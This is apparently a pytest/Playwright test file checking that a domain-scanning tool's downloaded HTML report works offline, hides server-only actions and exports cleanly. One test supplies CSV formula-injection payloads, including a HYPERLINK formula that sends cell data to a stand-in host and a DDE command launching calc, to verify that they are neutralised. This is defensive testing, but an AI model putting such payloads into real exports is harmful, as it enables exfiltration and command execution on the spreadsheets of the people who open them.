"""The downloaded HTML export, opened from disk the way a user opens it.

No server, no network. Every other export test asserts on a substring of the
generated HTML; this one is the only thing that ever opens the file.
"""
import json

import pytest

from services.html_export import build_standalone_html

_JOB = {
    "url_id": "offline1234567890123456",
    "domain": "stripedemo.com",
    "status": "completed",
    "created_at": "2026-09-01T10:00:00+00:00",
    "expires_at": "2026-09-30T10:00:00+00:00",
    "meta": {"snapshots_analyzed": 12, "total_findings": 3},
    "results": {
        "emails": [{"value": "ops@stripedemo.com", "first_seen": "2019-03",
                    "last_seen": "2023-11", "occurrences": 6}],
        "api_keys": [{"value": "pk_live_51H8x2kLm9QeR", "first_seen": "2019-03",
                      "last_seen": "2023-11", "occurrences": 6}],
    },
}


@pytest.fixture
def exported(tmp_path):
    f = tmp_path / "waytrace-stripedemo.com.html"
    f.write_text(build_standalone_html(_JOB), encoding="utf-8")
    return "file://" + str(f)


def test_the_file_renders_the_scan_with_no_network(exported, page):
    failed = []
    page.on("requestfailed", lambda r: failed.append(r.url))
    errors = []
    page.on("pageerror", lambda e: errors.append(str(e)))
    page.goto(exported)
    page.wait_for_timeout(1200)

    assert failed == [], f"the export still fetched something: {failed}"
    assert errors == []
    # Styled, not raw markup: the warm-dark body, not a transparent default.
    bg = page.evaluate("getComputedStyle(document.body).backgroundColor")
    assert bg not in ("rgba(0, 0, 0, 0)", "rgb(255, 255, 255)")
    # And it is the scan, not the home page it used to fall back to.
    assert "stripedemo.com" in page.inner_text("body")
    assert page.locator("#view-results.active").count() == 1


def test_it_offers_no_action_that_needs_the_server(exported, page):
    page.goto(exported)
    page.wait_for_timeout(1200)
    # Re-downloading, re-scanning, sharing a link and the expiry countdown all
    # go through the API. In a file on someone's disk they cannot.
    actions = page.locator("#view-results .results-actions").inner_text()
    for gone in ("Download HTML", "Scan more", "Copy link", "expires"):
        assert gone not in actions, f"{gone!r} is offered by a file with no server"
    # Same for the chrome around it.
    for sel in ("#domain-input", "#history-btn", "#account-btn",
                ".wt-bugfab", "#pagesearch-input"):
        assert not page.locator(sel).first.is_visible(), f"{sel} is live offline"


def test_the_client_side_export_drawer_still_works(exported, page):
    # This one builds JSON/CSV/Markdown from the data already in the page, so
    # it is the export that survives having no server. It must stay reachable.
    page.goto(exported)
    page.wait_for_timeout(1200)
    page.keyboard.press("e")
    page.wait_for_timeout(400)
    assert page.locator("#export-drawer.open").count() == 1
    built = page.evaluate("() => formatExport(buildExportData(), 'json')")
    assert "stripedemo.com" in built or "ops@stripedemo.com" in built


def test_it_says_what_it_is_and_when_it_was_taken(exported, page):
    page.goto(exported)
    page.wait_for_timeout(1200)
    banner = page.locator(".export-banner")
    assert banner.count() == 1
    assert banner.first.is_visible()
    assert "2026-09-01" in banner.first.inner_text()


def test_everything_local_still_works(exported, page):
    page.goto(exported)
    page.wait_for_timeout(1200)
    # Category navigation, presence tabs and the theme toggle need no server.
    assert page.locator(".r2-rlink").count() > 0
    assert page.locator(".wt-tab").count() > 0
    page.evaluate("() => window.setMode && window.setMode('light')")
    page.wait_for_timeout(200)
    light = page.evaluate("getComputedStyle(document.body).backgroundColor")
    page.evaluate("() => window.setMode && window.setMode('dark')")
    page.wait_for_timeout(200)
    assert light != page.evaluate("getComputedStyle(document.body).backgroundColor")


def test_it_opens_in_the_reader_s_language(exported, page, browser):
    ctx = browser.new_context(locale="fr-FR")
    p = ctx.new_page()
    p.goto(exported)
    p.wait_for_timeout(1200)
    assert p.evaluate("document.documentElement.lang") == "fr"
    ctx.close()


def test_the_shortcut_panel_promises_nothing_the_file_cannot_do(exported, page):
    page.goto(exported)
    page.wait_for_timeout(1200)
    page.locator(".r2-kbhint").click()
    page.wait_for_timeout(300)
    # Assert on the keys, not the rendered copy: the panel opens in whatever
    # language the reader's browser asked for.
    shown = page.evaluate("""() => [...document.querySelectorAll('#kb-overlay .kb-desc')]
        .filter(e => e.offsetParent !== null)
        .map(e => e.getAttribute('data-i18n') || e.getAttribute('data-i18n-html'))""")
    assert "kb.e" in shown           # the client-side export works from the file
    assert "kb.h" not in shown       # History and New scan leave the report,
    assert "kb.n" not in shown       # which a file on a disk cannot do


def test_the_client_side_csv_neutralises_formulas(exported, page):
    # Same hole as the server's export.csv: the drawer builds a CSV from values
    # that came out of someone else's archived page.
    page.goto(exported)
    page.wait_for_timeout(1200)
    csv = page.evaluate("""() => formatExport([
      {category: 'emails', value: '=HYPERLINK("https://evil.test?x="&A1,"c")'},
      {category: 'emails', value: '+1+cmd|\\'/c calc\\'!A0'},
      {category: 'emails', value: '@SUM(1+1)'},
      {category: 'emails', value: 'ops@x.com'},
    ], 'csv')""")
    for line in csv.split("\n")[1:]:
        for cell in line.split(","):
            assert cell[:1] not in ("=", "+", "-", "@"), f"{cell!r} is a formula"
    assert "ops@x.com" in csv        # an ordinary value is untouched


def test_the_markdown_export_says_what_it_is_about(exported, page):
    """Markdown is the format people paste into a written report, and it
    started at the first category heading: nothing on the page said which
    domain it described or when the scan was taken."""
    page.goto(exported)
    page.wait_for_timeout(1200)
    page.keyboard.press("e")
    page.wait_for_timeout(400)
    md = page.evaluate("() => formatExport(buildExportData(), 'markdown')")
    head = md.split("##")[0]
    assert "stripedemo.com" in head
    assert "2026-09-01" in head          # the day the scan was taken
    assert "WayTrace" in head
    assert "—" not in md                 # house style: no em dashes
